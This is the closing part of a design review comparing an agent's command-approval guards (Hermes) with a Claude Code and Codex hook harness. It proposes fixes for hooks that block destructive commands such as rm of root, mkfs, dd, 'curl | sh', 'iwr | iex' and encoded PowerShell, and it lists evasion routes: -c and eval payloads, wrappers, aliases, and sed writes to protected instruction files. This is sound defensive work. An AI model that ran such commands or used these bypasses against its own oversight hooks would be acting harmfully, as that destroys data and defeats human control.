| Hook trust | Codex stores a `trusted_hash` per hook entry (`codex/config.toml:99-106`) | have | Keep. Hermes records the mtime, and only a manual doctor command checks it. |
| One timeout owner | Codex hook 20 s; each shared script 15 s, up to 5 in a row (`policy.py:36-38, 228-235`) | partial | H1 runs one process. Codex behaviour on its own hook timeout is not verified. |
| `sudo` checks | Claude denies `Bash(sudo *)`. The hooks and Codex have none. | partial | No change now. |
| Guardian LLM | none | rejected | Keep rejected (plan §2). |

### Fix now

These changes fix existing rules, so they add no new gate. Add the fixture
before each change. If the freeze also covers rule changes, move them into H1.

1. `block-destructive-bash.sh:57`: accept any flags before the recursive or
   force flag. Fixes cases 6 and 7.
2. `block-destructive-bash.sh:57, 63`: accept `//`, `/.` and `/..` as root.
   Fixes case 5.
3. `block-destructive-bash.sh:68`: match `mkfs` with or without a suffix, add
   `mmcblk` and add `>` redirects. Require `of=` for `dd`. Fixes cases 15-18.
4. `block-destructive-bash.sh:82-85`: accept `--h`, `--ha` and `--har`. Fixes
   case 19.
5. `block-destructive-bash.sh:82-85, 107-108`: find the flag in the same
   simple command. Cut at `;`, `&` and `|`. Fixes case 33.
6. `block-destructive-bash.sh:115`: allow a tree-ish or `--source=` before
   `.`. Fixes cases 22-23.
7. `warn-force-push.sh:73`: match `f` inside combined short flags, and long
   prefixes of `--force-with-lease`. Fixes cases 24-25.

Case 5 is mostly theory: GNU `rm` refuses `/` without `--no-preserve-root`.

### H1: one Python hook core (re-judged)

Keep H1. Change the design in these ways:

1. Parse each command once into simple commands. Use a quote-aware scanner.
   Take quote state from the raw text, as Hermes learned (1475-1482).
2. Start from the scanner in `policy.py:47-76`. Do not use `shlex` for
   detection. It fails on open quotes and Windows paths.
3. Anchor deny rules at command position, per simple command. Allow loose
   matching only for ask rules. This removes the false denials (cases 18,
   30-33).
4. In the same change, add the parts that work today only because rules match
   anywhere:
   - a wrapper table, like Hermes 609-628 (cases 13-14);
   - recursion into `-c` payloads of the 5 shells and into `eval` (cases 1-2);
   - recursion into `$()` and backticks.
5. Without step 4, anchoring makes cases 1, 2, 13 and 14 pass. Hermes shows
   this risk (§4.3).
6. Normalize as in §4.1, and deobfuscate command words (cases 9-11).
7. Do not ask on every shell `-c` or interpreter flag. Hermes does. In an
   agent harness that would prompt on routine work.
8. Parse git global options like `self_repo_guard.py:373-405`.
9. Resolve aliases with `git config --get alias.X`. Use a 1 s timeout and
   depth 4, and scan `!` aliases. This replaces the hand-synced lists
   (`block-destructive-bash.sh:38-45`).
10. Fail closed on the Hermes parser limits and on malformed quoting.
11. Keep the ADR 0087 launcher deny for a missing interpreter. Run all checks
    in one process, so one timeout owns the decision.
12. Port the cases in §8 before the migration.

Plan correction: the plan says nine bash hooks all need `jq`. Eight hooks use
`jq`. The ninth file, `worktree-readiness.sh`, is a sourced helper without
`jq`. The writer guard can also use `python3`.

H2 (the recommended narrow memory guard) fits in this core. It can reuse the
invisible-Unicode class (`approval_detection.py:349-351`). It can also reuse a
short subset of the 56 prefixes (`redact.py:147-222`).

### H3: PowerShell coverage (re-judged)

Keep H3 as part of W1.

- Add the 25 Windows rules (244-286) as data, with the decision "ask". Hermes
  asks on all of them; none is hardline.
- Check the Bash tool command and the PowerShell tool command. Git Bash can
  run `cmd /c` and `powershell -Command`.
- Add the backslash-path variant (1452-1455). Fold `C:\Users\<name>` and
  `%USERPROFILE%` to `~`.
- Scan the `-Command` payload with the same rules. Do not ask on every
  `-Command`, as Hermes does (638-642).
- Ask on `-EncodedCommand`, because it hides the payload (248).
- Still open from W1: the PowerShell tool name in your Claude Code version.
  Also open: whether Codex on Windows fires the same hook events.
- Freeze: H3 extends the existing destructive-command gate to a new shell. It
  asks and never denies, so it can ship with W1. This is my judgment; confirm
  it.

### The three quick wins (re-judged)

1. **`bash -c` payload scan: downgrade.**
   - The earlier version said `bash -c 'git reset --hard'` passes today. That
     is wrong: the probe shows a deny. The `eval` form is denied too (case 2).
   - Three hooks already see `-c` and `eval` payloads. The trailer hook misses
     them (case 29).
   - By reading, the test-runner hook also misses `bash -c 'php artisan
     test'`.
   - Neither gap is a safety gate. Close both in H1.
2. **`curl | sh`: keep as ask, in Phase 4.**
   - Hermes keeps it in DANGEROUS (313). Its docs call it unrecoverable, but
     the code does not.
   - It is a new gate, so it waits for the freeze to end.
   - Port the whole group: 5 shells with paths, process substitution (314),
     `eval`, `source` or `.` of `$(curl)` (316), decode pipes (332-338) and
     `iwr | iex` (259-260).
   - Add the negatives: case 39 and `echo bash is fast`.
3. **Protected instruction files: keep, Phase 4, narrower.**
   - Hermes guards file tools only (189-190). It asks every time and ignores
     yolo. Its terminal check is not in the code.
   - For us: ask on `Write`, `Edit` and `apply_patch` for `CLAUDE.md` and
     `AGENTS.md` (any folder, any case, realpath).
   - Also cover `claude/settings.json`, `codex/config.toml` and the hook
     files.
   - Start with the writer personas only. This repository edits these files in
     most harness tickets, so a main-session prompt would fire often.
   - A shell write (`sed -i`, `>`) still bypasses it, as in Hermes. Accept
     that, or add the paths to the H1 redirect checks.

### Do not copy

- The guardian LLM (`smart` mode). The plan rejects it, and it is not testable.
- The blanket ask on shell `-c` and interpreter flags.
- The hook consent allowlist. Codex trust covers it, and our Claude hooks are
  committed files.
- An mtime record that only a manual doctor command checks.
- Two timeouts for one hook (§2.2).

## Sources

Hermes commit `5fea5a7a4bf6d02b3427fc0bcae95502222cea2e`. Paths are relative to
the repository root.

Code:
- `tools/approval.py`
- `tools/approval_detection.py`
- `tools/approval_floors.py`
- `tools/approval_smart.py`
- `tools/approval_yolo.py`
- `tools/approval_context.py`
- `tools/approval_prompt.py`
- `tools/approval_gateway_wait.py`
- `tools/approval_human_wait.py`
- `tools/self_repo_guard.py`
- `tools/terminal_tool_guards.py`
- `tools/file_tools_write_guards.py`
- `agent/file_safety.py`
- `agent/shell_hooks.py`
- `agent/redact.py`
- `tools/environments/local_env_policy.py`
- `tools/environments/local.py` (part)
- `tools/mcp_tool_config.py` (part)
- `hermes_cli/plugins.py` (part)
- `hermes_cli/plugins_dispatch.py` (part)
- `hermes_cli/_subprocess_compat.py` (part)
- `hermes_cli/mcp_security.py` (part)
- `agent/runtime_self_protection.py` (part)
- `agent/prompt_builder.py` (part)
- `tools/threat_patterns.py` (part)
- `gateway/status.py` (part)

Tests and evals:
- `tests/tools/test_hardline_blocklist.py`
- `tests/tools/test_self_repo_guard.py`
- `tests/tools/test_execution_flag_detection.py`
- `tests/tools/test_shell_bypass_denylist.py`
- `tests/tools/test_hardline_escaped_quote_state.py`
- `tests/tools/test_approval_windows.py`
- `tests/tools/test_approval_deny_rules.py`
- `tests/tools/test_approval_global_flag_scan.py`
- `tests/tools/test_approval.py` (part)
- `tests/tools/test_file_write_safety.py` (part)
- `tests/agent/test_shell_hooks.py` (part)
- `tests/agent/test_shell_hooks_consent.py` (test names)
- `tests/tools/test_terminal_self_repo_guard.py` (test names)
- `evals/postmortem/live_ab/hardline_scanner_matrix.py`

Docs:
- `website/docs/user-guide/security.md` (part)
- `website/docs/user-guide/features/hooks.md` (part)

Harness files read (paths relative to `dotfiles/`):
- `claude/hooks/*`, `claude/settings.json`, `claude/agents/executor.md`,
  `claude/agents/test-engineer.md`
- `codex/hooks/policy.py`, `codex/hooks.json`, `codex/rules/harness.rules`,
  `codex/agents/*.toml`, `codex/config.toml` (hook trust entries)
- `tools/tests/test-hooks.sh`, `test-commit-trailers.sh`,
  `test-isolated-test-runner.sh`, `test-codex-harness.py`
- `.gitconfig` (alias section), `docs/adr/` (file names)
